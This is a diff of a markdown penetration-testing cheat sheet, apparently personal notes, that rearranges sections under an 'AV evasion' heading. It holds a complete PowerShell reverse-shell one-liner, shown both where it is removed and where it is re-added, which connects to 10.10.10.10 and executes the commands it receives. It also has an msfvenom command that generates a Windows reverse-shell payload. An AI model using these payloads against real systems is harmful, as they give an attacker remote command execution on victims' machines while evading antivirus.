@@ -19,12 +19,11 @@ mkdir mywebdav
 
 ## AV evasion
 
-### Powershell
+### Powershell reminder
 
 #### Basics
 
 Get help:
-
 ```
 Get-Help somecommand
 Get-Command -ParameterName ComputerName
@@ -42,10 +41,22 @@ Base64: https://stackoverflow.com/questions/15414678/how-to-decode-a-base64-stri
 [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("sometext"))
 ```
 
-#### Memory injection
+#### Powershell reverse shell one-liner
 
+- source: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
+- command:
+```
+$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+- base64: https://github.com/darkoperator/powershell_scripts/blob/master/README
+
+### Powershell memory injection
+
+Memory injection types:
 - https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
 - https://blog.f-secure.com/memory-injection-like-a-boss/
+
+#### Script
 
 ```
 $code = '
@@ -79,15 +90,6 @@ Shell code:
 ```
 kali$ msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f powershell -v sc
 ```
-
-#### Reverse shell one-liner
-
-- source: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
-- command:
-```
-$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-- base64: https://github.com/darkoperator/powershell_scripts/blob/master/README
 
 #### Execution policy
 
